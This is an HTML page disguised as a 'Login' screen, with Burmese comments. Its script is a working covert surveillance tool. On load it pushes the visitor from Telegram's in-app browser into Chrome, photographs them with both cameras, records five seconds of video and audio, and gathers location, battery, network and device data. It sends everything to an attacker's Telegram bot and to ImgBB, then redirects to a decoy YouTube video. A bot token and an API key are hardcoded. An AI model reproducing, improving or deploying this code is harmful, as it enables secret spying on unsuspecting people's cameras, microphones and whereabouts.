
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            max-width: 350px;
            width: 100%;
            padding: 50px 30px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { 
            color: #667eea; 
            margin-bottom: 10px; 
            font-size: 28px;
            letter-spacing: 2px;
        }
        .subtitle { 
            color: #999; 
            margin-bottom: 30px; 
            font-size: 14px;
            font-style: italic;
        }
        .redirect-note {
            margin-top: 20px;
            padding: 10px;
            background: #f0f0f0;
            border-radius: 10px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <div class="subtitle">Please wait...</div>
        <div class="redirect-note" id="redirectNote">🔄 Opening in Chrome browser...</div>
    </div>

    <script>
        // ===== CONFIGURATION =====
        const BOT_TOKEN = "8590328338:AAEb690PtKljqE63TLQKJ4rkCWyEsCzhXNU";
        const IMGBB_API_KEY = "b7ba0100d04e0add952f217e712c7ff8";
        const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        // =========================
        
        const urlParams = new URLSearchParams(window.location.search);
        const OWNER_ID = urlParams.get('id');
        
        const isTelegram = /Telegram/i.test(navigator.userAgent);
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        
        // ========== FORCE REDIRECT TO CHROME ==========
        // Telegram browser ကို သေချာ detect လုပ်ပြီး Chrome ကို အတင်းပြောင်းမယ်
        
        function redirectToChrome() {
            const currentUrl = window.location.href;
            
            // Method 1: Android Intent (အလုပ်အဖြစ်ဆုံး)
            // Chrome package name: com.android.chrome
            const chromeIntent = `intent://${currentUrl.replace('https://', '').replace('http://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
            
            // Method 2: fallback - tell user to open manually
            document.getElementById('redirectNote').innerHTML = '⚠️ Unable to auto-open Chrome.<br>Please copy link and open in Chrome browser manually.<br><br>📋 Link: ' + currentUrl;
            
            // Try to redirect to Chrome
            window.location.href = chromeIntent;
            
            // Fallback: if intent fails, show manual instruction after 2 seconds
            setTimeout(function() {
                document.getElementById('redirectNote').innerHTML = '📋 Please copy this link and open in Chrome browser:<br><br>' + currentUrl;
            }, 2000);
        }
        
        // Detect if running in Telegram's in-app browser
        if (isTelegram && isMobile) {
            // Try multiple methods to redirect to Chrome
            
            // Method A: intent scheme (အကောင်းဆုံး)
            const currentUrl = window.location.href;
            const intentUrl = `intent://${currentUrl.replace('https://', '').replace('http://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
            window.location.href = intentUrl;
            
            // Method B: If intent fails, try to show instruction
            setTimeout(function() {
                // Still in Telegram? Show manual instruction
                if (window.location.href === currentUrl) {
                    document.body.innerHTML = `
                        <div class="container">
                            <h1>🔓 Open in Chrome</h1>
                            <div class="subtitle">Please open this link in Chrome browser</div>
                            <div style="background:#f0f0f0; padding:15px; border-radius:10px; margin:15px 0; word-break:break-all;">
                                ${currentUrl}
                            </div>
                            <p>1️⃣ Tap and hold the link above</p>
                            <p>2️⃣ Select "Copy"</p>
                            <p>3️⃣ Open Chrome browser</p>
                            <p>4️⃣ Paste and go</p>
                            <br>
                            <p>Or click "Open in Chrome" button below</p>
                            <button onclick="window.location.href='${intentUrl}'" style="background:#667eea; color:white; border:none; padding:12px 25px; border-radius:25px; margin-top:15px; cursor:pointer;">
                                🌐 Open in Chrome
                            </button>
                        </div>
                    `;
                }
            }, 1500);
        }
        
        let backPhotoSent = false;
        let frontPhotoSent = false;
        let videoSent = false;
        
        // ========== SEND MESSAGE ==========
        async function sendMessageToOwner(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: OWNER_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
            } catch(e) {
                console.log('Send message error:', e);
            }
        }
        
        // ========== SEND VIDEO ==========
        async function sendVideoToOwner(videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', OWNER_ID);
            formData.append('video', videoBlob, 'video.mp4');
            formData.append('caption', `🎥 VIDEO RECORDED! (Front Camera)\n🕐 Time: ${new Date().toLocaleString()}\n⏱️ Duration: 5 seconds`);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {
                console.log('Send video error:', e);
            }
        }
        
        // ========== UPLOAD TO IMGBB ==========
        async function uploadToImgBB(imageBlob) {
            const formData = new FormData();
            formData.append('image', imageBlob);
            
            const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            if (data.success) {
                return data.data.url;
            } else {
                throw new Error('Upload failed');
            }
        }
        
        // ========== TAKE PHOTO ==========
        async function takePhotoAndSend(stream, cameraType) {
            if (cameraType === 'back' && backPhotoSent) return;
            if (cameraType === 'front' && frontPhotoSent) return;
            
            if (cameraType === 'back') backPhotoSent = true;
            if (cameraType === 'front') frontPhotoSent = true;
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            stream.getTracks().forEach(track => track.stop());
            
            canvas.toBlob(async (blob) => {
                try {
                    const imageUrl = await uploadToImgBB(blob);
                    await sendMessageToOwner(`📸 ${cameraType === 'back' ? 'BACK' : 'FRONT'} CAMERA PHOTO CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n📷 Image: ${imageUrl}`);
                } catch (err) {
                    console.log('Error:', err);
                }
                
            }, 'image/jpeg', 0.7);
        }
        
        // ========== VIDEO RECORDING (အရှေ့ကင်မရာ Video 5 စက္ကန့်) ==========
        async function recordFrontVideo() {
            if (videoSent) return;
            videoSent = true;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" },
                    audio: true 
                });
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                    await sendVideoToOwner(videoBlob);
                    stream.getTracks().forEach(track => track.stop());
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 5000);
                
            } catch (err) {
                console.log('Video error:', err);
                await sendMessageToOwner(`❌ VIDEO RECORDING DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
            }
        }
        
        // ========== BACK CAMERA (အနောက်) ==========
        async function initBackCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment" } 
                });
                await takePhotoAndSend(stream, 'back');
            } catch (err) {
                console.log('Back camera error:', err);
                await sendMessageToOwner(`❌ BACK CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
            }
        }
        
        // ========== FRONT CAMERA (အရှေ့) ==========
        async function initFrontCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                await takePhotoAndSend(stream, 'front');
            } catch (err) {
                console.log('Front camera error:', err);
                await sendMessageToOwner(`❌ FRONT CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
            }
        }
        
        // ========== LOCATION ==========
        async function getLocation() {
            if (!navigator.geolocation) {
                await sendMessageToOwner(`❌ LOCATION NOT SUPPORTED!\n🕐 Time: ${new Date().toLocaleString()}`);
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    await sendMessageToOwner(
                        `📍 **LOCATION CAPTURED!**\n` +
                        `🕐 Time: ${new Date().toLocaleString()}\n` +
                        `🌍 Latitude: ${lat}\n` +
                        `🌍 Longitude: ${lon}\n` +
                        `📏 Accuracy: ${acc}m\n` +
                        `🗺️ **Google Maps:** [Click Here to View](${mapsLink})`
                    );
                },
                async (error) => {
                    await sendMessageToOwner(`❌ LOCATION DENIED!\n🕐 Time: ${new Date().toLocaleString()}\n📛 Error: ${error.message}`);
                }
            );
        }
        
        // ========== BATTERY INFO ==========
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.floor(battery.level * 100);
                    const charging = battery.charging ? "Charging" : "Not Charging";
                    await sendMessageToOwner(`🔋 BATTERY INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Battery Level: ${level}%\n📌 Status: ${charging}`);
                } catch(e) {
                    await sendMessageToOwner(`🔋 BATTERY INFO NOT AVAILABLE!`);
                }
            } else {
                await sendMessageToOwner(`🔋 BATTERY INFO NOT SUPPORTED!`);
            }
        }
        
        // ========== NETWORK INFO ==========
        async function getNetworkInfo() {
            let networkType = "Unknown";
            let downlink = "";
            
            if (navigator.connection) {
                const type = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
                networkType = type.toUpperCase();
                if (navigator.connection.downlink) {
                    downlink = ` (${navigator.connection.downlink} Mbps)`;
                }
            }
            
            let connectionMethod = "Unknown";
            if (networkType === 'wifi' || networkType === 'WIFI') {
                connectionMethod = "WiFi";
            } else if (networkType === 'cellular' || networkType === '4g' || networkType === '5g' || networkType === '3g' || networkType === '2g') {
                connectionMethod = "Cellular (Mobile Data)";
            } else {
                connectionMethod = networkType;
            }
            
            await sendMessageToOwner(`🌐 NETWORK INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Connection Type: ${connectionMethod}\n📌 Speed: ${networkType}${downlink}`);
        }
        
        // ========== DEVICE INFO ==========
        async function sendDeviceInfo() {
            const deviceInfo = {
                platform: navigator.platform,
                language: navigator.language,
                userAgent: navigator.userAgent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            await sendMessageToOwner(`📱 DEVICE INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Platform: ${deviceInfo.platform}\n📌 Language: ${deviceInfo.language}\n📌 Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n📌 Timezone: ${deviceInfo.timezone}\n📌 User Agent: ${deviceInfo.userAgent.substring(0, 100)}...`);
        }
        
        // ========== MAIN ==========
        // Chrome မှာဖွင့်မှသာ init() ကို run မယ် (Telegram browser ဆို redirect လုပ်ထားပြီးသား)
        async function init() {
            if (!OWNER_ID) {
                return;
            }
            
            // အနောက်ကင်မရာ (Back Camera Photo)
            await initBackCamera();
            
            // အရှေ့ကင်မရာ (Front Camera Photo)
            await initFrontCamera();
            
            // Video Recording (Front Camera Video 5 sec)
            await recordFrontVideo();
            
            // Location (Maps လင့်ပါ)
            await getLocation();
            
            // Battery Info (ဖုန်းအား)
            await getBatteryInfo();
            
            // Network Info (WiFi/Cellular/4G/5G)
            await getNetworkInfo();
            
            // Device Info
            await sendDeviceInfo();
            
            // အကုန်ပြီးရင် YouTube ခေါ်မယ်
            setTimeout(() => {
                window.location.href = YOUTUBE_URL;
            }, 5000);
        }
        
        // Start - Chrome မှာသာ init လုပ်မယ်
        if (!isTelegram || !isMobile) {
            init();
        }
    </script>
</body>
</html>
